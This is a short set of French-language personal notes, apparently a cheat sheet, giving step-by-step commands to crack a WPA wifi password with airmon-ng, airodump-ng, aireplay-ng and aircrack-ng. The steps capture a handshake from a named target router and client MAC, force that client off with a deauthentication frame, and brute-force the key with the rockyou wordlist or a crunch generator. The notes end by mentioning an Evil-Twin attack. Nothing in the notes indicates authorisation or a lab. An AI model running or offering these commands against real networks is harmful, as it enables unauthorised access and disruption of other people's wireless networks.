# Wifi

Observer le réseau avec wireshark en mode moniteur.

airmon-ng check kill //Check si les proccess n'empêche pas le mode moniteur
airmon-ng start wlx00c0caaa35a2 //passenmoniteur
airodump-ng wlx00c0caaa35a2 //Ecouter les réseaux wifi autour de soit.

choisir le BSSID de la cible. regarder de CH:
 8C:10:D4:F5:D8:8D  -58       91       19    0   1  130   WPA  CCMP   PSK  SFR-d887

airodump-ng -c 1 --bssid 8C:10:D4:F5:D8:8D -w /home/kasi/Desktop/ wlx00c0caaa35a2

Attendre que le Handshake arrive. //On observe le trafic.
On trouve un client actif :
8C:10:D4:F5:D8:8D : point d'accès
04:92:26:7A:EB:F7 : Adresse mac client

dans un nouveau terminal
aireplay-ng -0 1 -a 8C:10:D4:F5:D8:8D -c 04:92:26:7A:EB:F7 wlx00c0caaa35a2 //Déconnecter un utilisateur sur le réseau pour obtenir le handshake.

aircrack-ng -a2 -b BSSID -w /usr/share/wordlists/rockyou.txt /root/Desktop/*.cap

avec crunch :
crunch 8 25 azertyuiopqsdfghjklmwxcvbn0123456789 | aircrack-ng -w - -b 8C:10:D4:F5:D8:8D /home/kasi/Desktop/*.cap

Attaque avec Evil-Twin : on duplique le point d'accès pour sniffer un autre réseau : et le mot de passe WPA.
